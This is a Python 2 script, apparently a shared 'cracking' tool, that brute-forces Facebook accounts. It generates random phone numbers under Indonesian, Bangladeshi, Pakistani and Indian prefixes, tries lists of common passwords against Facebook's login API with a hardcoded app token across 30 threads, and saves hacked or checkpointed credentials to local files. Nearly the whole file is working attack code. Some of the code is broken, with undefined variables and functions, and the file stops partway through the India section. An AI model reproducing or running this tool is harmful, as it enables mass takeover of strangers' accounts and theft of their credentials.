#coding=utf-8
#!/usr/bin/python2
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(2000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print (nmbr)
    sys.stdout.flush()

os.system('rm -rf ..txt')
for n in range(2500):
    nmbr = random.randint(11, 999)
    sys.stdout = open('..txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install tqdm')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 main.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def mengetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def keluar():
    print 'Keluar'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)



logo =""" 

\033[1;91m ##     ##  #######  ##     ##  ######  #### ##    ## 
\033[1;92m ###   ### ##     ## ##     ## ##    ##  ##  ###   ## 
\033[1;94m #### #### ##     ## ##     ## ##        ##  ####  ## 
\033[1;92m ## ### ## ##     ## #########  ######   ##  ## ## ## 
\033[1;93m ##     ## ##     ## ##     ##       ##  ##  ##  #### 
\033[1;95m ##     ## ##     ## ##     ## ##    ##  ##  ##   ### 
\033[1;94m ##     ##  #######  ##     ##  ######  #### ##    ## 
\033[1;97m I Don't Have An Attitude Problem
\033[1;97m I Just Have An Personality You Can't Handle It
\x1b[1;41m Creator MOHSIN ALI ! \x1b[00m
\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n  \x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] FACEBOOK : MOHSIN ALI\n  \x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] GITHUB : github.com/MohsinTheLegend\n  \x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] Page : 𝙈𝙊𝙃𝙎𝙄𝙉 𝙏𝙍𝙄𝘾𝙆𝙀𝙍 ツ\n  \x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]Coded ByBy MOHSIN ALIALI\n  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



"""
back = 0
berhasil = []
cekpoint = []
oks = []
okb = []
id = []
cpb = []
cps = []

def menu():
    os.system('clear')
    print logo
    print '\x1b[1;97m[\x1b[1;92m01\x1b[1;97m]\x1b[1;97m Crack Using Mobile Phone'
    print '\x1b[1;97m[\x1b[1;92m02\x1b[1;97m]\x1b[1;97m Crack Using Email'
    print '\x1b[1;97m[\x1b[1;92m03\x1b[1;97m]\x1b[1;97m Crack From Friendslist & Public \x1b[1;97m[ \x1b[1;92mLOGIN \x1b[1;97m]'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;97m Exit this program'
    print 50 * '\x1b[1;97m~'
    pilih_menu()


def pilih_menu():
    unikers = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97m( \x1b[1;91mChoose\x1b[1;97m ) > \x1b[92m')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Wrong input !'
        pilih_menu()
    elif unikers == '1' or unikers == '01':
        crack_nomor()
    elif unikers == '2' or unikers == '02':
        crack_email()
    elif unikers == '3' or unikers == '03':
        os.system('python2 MOHSIN.py')
    elif unikers == '0' or unikers == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m\xc3\xb7\x1b[1;97m] Wrong input !'
        pilih_menu()


def crack_nomor():
    os.system('clear')
    print logo
    print '\x1b[1;97m[\x1b[1;92m01\x1b[1;97m]\x1b[1;91m Crack Account Indonesia'
    print '\x1b[1;97m[\x1b[1;92m02\x1b[1;97m]\x1b[1;94m Crack Account Bangladesh'
    print '\x1b[1;97m[\x1b[1;92m03\x1b[1;97m]\x1b[1;92m Crack Account Pakistan'
    print '\x1b[1;97m[\x1b[1;92m04\x1b[1;97m]\x1b[1;96m Crack Account India'
    print '\x1b[1;97m[\x1b[1;92m05\x1b[1;97m]\x1b[1;97m Crack Account Vietnam'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;92m Back To Menu          '
    print 50 * '\x1b[1;97m~'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97m( \x1b[1;91mChoose\x1b[1;97m ) > \x1b[1;92m')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91mx\x1b[1;97m]\x1b[1;91m Wrong input !'
        pilih()
    elif unikers == '1' or unikers == '01':
        indo()
    elif unikers == '2' or unikers == '02':
        bangla()
    elif unikers == '3' or unikers == '03':
        pakistan()
    elif unikers == '4' or unikers == '04':
        india()
    elif unikers == '5' or unikers == '05':
        nguyen()
    elif unikers == '0' or unikers == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m\xc3\xb7\x1b[1;97m] Wrong input !'
        pilih()


def indo():
    global cekpoint
    global oks
    os.system('clear')
    print logo
    print '\x1b[1;92m    951-331-953-954-955-956-520-521-522-523'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;92m ')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;96m select between 3 digit !!') if len(c) < 3 else ''
        k = '+628'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(1)
    jalan("\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mDon't Close !")
    time.sleep(1)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            pass1 = 'Sayang'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/ind.txt', 'a')
                okb.write('[OK] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/ind.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = 'Anjing'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/ind.txt', 'a')
                    okb.write('[OK] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/ind.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Bangsat'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/ind.txt', 'a')
                        okb.write('[OK] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/ind.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = 'Kontol'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass4
                            okb = open('save/ind.txt', 'a')
                            okb.write('[Berhasil] ' + k + c + user + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass4
                            cps = open('save/ind.txt', 'a')
                            cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = 'memek'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass5
                                okb = open('save/ind.txt', 'a')
                                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass5
                                cps = open('save/ind.txt', 'a')
                                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Cantik'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'access_token' in w:
                                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass6
                                    okb = open('save/ind.txt', 'a')
                                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass6 + '\n')
                                    okb.close()
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in w['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass6
                                    cps = open('save/ind.txt', 'a')
                                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass6 + '\n')
                                    cps.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Indonesia'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    w = json.load(data)
                                    if 'access_token' in w:
                                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass7
                                        okb = open('save/ind.txt', 'a')
                                        okb.write('[Berhasil] ' + k + c + user + ' | ' + pass7 + '\n')
                                        okb.close()
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in w['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;93mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass7
                                        cps = open('save/ind.txt', 'a')
                                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass7 + '\n')
                                        cps.close()
                                        cekpoint.append(user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;97m~'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Done'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mHACK\x1b[1;97m/\x1b[1;93mCHECK \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK File : save/ind.txt'
    print 50 * '\x1b[1;97m~'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 MOHSIN.py')


def bangla():
    os.system('clear')
    print logo
    print '\x1b[1;92m    191-192-193-194-195-196-197-198-199'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;92m ')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;91m Kode Wajib 3 Digit !!') if len(c) < 3 else ''
        k = '+880'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ BACK ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mDon't close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/bangla1.txt', 'a')
                okb.write('[OK] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/bangla1.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' \xe2\x88\x86 ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '786786'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/bangla1.txt', 'a')
                    okb.write('[OK] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/bangla1.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Bangladesh'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/bangla1.txt', 'a')
                        okb.write('[OK] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/bangla1.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Done ....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK File : save/bangla1.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 MOHSIN.py')


def pakistan():
    os.system('clear')
    print logo
    print '\x1b[1;92m    355-334-335-336-337-338-339-351-352'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;92m')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;91m Select Between 3 Digit !!') if len(c) < 3 else ''
        k = '+92'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Kembali ]')
        rizky4()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mDon't close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/pakistan.txt', 'a')
                okb.write('[OK] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/pakistan.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '786786'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/pakistan.txt', 'a')
                    okb.write('[OK] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/pakistan.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Pakistan'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/pakistan.txt', 'a')
                        okb.write('[OK] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/pakistan.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Done....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK File : save/pakistan.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 main.py')


def india():
    os.system('clear')
    print logo
    print '\x1b[1;92m       905-755-995-855-935-965-975'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;92m')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;91m Select Between 3 Digit !!') if len(c) < 3 else ''
        k = '+91'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ BACK ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mDon't close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/india.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/india.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
